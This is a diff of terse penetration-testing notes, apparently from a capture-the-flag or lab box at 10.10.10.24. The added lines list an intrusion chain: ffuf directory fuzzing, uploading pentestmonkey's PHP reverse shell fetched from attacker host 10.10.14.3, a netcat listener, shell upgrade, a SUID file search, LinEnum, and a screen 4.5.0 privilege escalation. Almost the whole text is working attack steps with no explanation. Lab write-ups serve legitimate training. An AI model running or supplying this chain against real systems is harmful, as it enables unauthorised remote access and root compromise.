@@ -1,9 +1,14 @@
 ```
-/exposed.php
-php-reverse-shell
-10.10.10.24/uploads/shell2.php
+ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.10.24/FUZZ -e .aspx,.php,.txt,.html,.sh
+http://10.10.10.24/exposed.php
+https://github.com/pentestmonkey/php-reverse-shell.git
+http://10.10.14.3/php-reverse-shell.php -o uploads/php-reverse-shell.php
+nc -nlvp 1234
+http://10.10.10.24/uploads/php-reverse-shell.php
+python3 -c "import pty;pty.spawn('/bin/bash’)
+find / -perm -4000 2>/dev/null
 LinEnum.sh
-screen 4.5.0
+screen 4.5.0 privesc
 ```
 
 
